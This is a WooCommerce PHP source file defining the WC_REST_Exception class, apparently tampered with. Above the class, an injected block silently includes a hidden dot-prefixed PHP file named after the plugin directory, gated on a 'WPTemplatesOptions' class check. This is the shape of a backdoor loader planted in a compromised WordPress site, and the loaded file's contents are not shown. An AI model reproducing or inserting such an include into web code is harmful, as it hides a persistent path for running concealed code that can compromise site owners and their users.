<?php
/**
 * WooCommerce REST Exception Class
 *
 * Extends Exception to provide additional data.
 *
 * @package WooCommerce\RestApi
 * @since   2.6.0
 */

defined( 'ABSPATH' ) || exit;

/**
 * WC_REST_Exception class.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_REST_Exception extends WC_Data_Exception {}
